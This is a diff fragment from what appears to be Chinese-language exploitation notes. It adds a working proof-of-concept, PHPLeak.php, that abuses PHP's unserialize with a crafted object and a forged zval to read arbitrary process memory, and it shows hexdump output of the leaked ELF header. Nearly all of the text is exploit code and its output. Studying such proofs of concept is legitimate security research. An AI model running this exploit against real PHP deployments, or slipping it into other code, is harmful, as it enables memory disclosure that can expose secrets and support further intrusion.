@@ -472,6 +472,27 @@ gdb
     AAA..AA(39xA)这个zval所在的内存的位置
     运行/usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c
 
+    ---------PHPLeak.php------------
+    &lt;?php
+    $fakezval = pack(
+        'IIII',     //unsigned int
+        0x08048000, //address to leak
+        0x0000000f, //length of string
+        0x00000000, //refcount
+        0x00000006  //data type NULL=0,LONG=1,DOUBLE=2,BOOL=3,ARR=4,OBJ=5,STR=6,RES=7
+    );
+    //obj from original POC by @ion1c
+    $obj = 'O:8:"stdClass":4:{s:3:"aaa";a:5:{i:0;i:1;i:1;i:2;i:2;a:1:{i:0;i:1;}i:3;i:4;i:4;i:5;}s:3:"aaa";i:1;s:3:"ccc";R:5;s:3:"ddd";s:4:"AAAA";}';
+    $obj=unserialize($obj);
+
+    for($i = 0; $i &lt; 5; $i++) { //this i value is larger than usually required
+        $v[$i]=$fakezval.$i; //repeat to overwrite
+    }
+    //due to the reference being overwritten by our loop above, leak memory
+    echo $obj-&gt;ccc;
+    ?&gt;
+    ---------PHPLeak.php------------
+
     output:
     $ /usr/bin/ndphp/bin/php PHPLeak.php | hexdump -c
     0000000 177   E   L   F 001 001 001  \0  \0  \0  \0  \0  \0  \0  \0
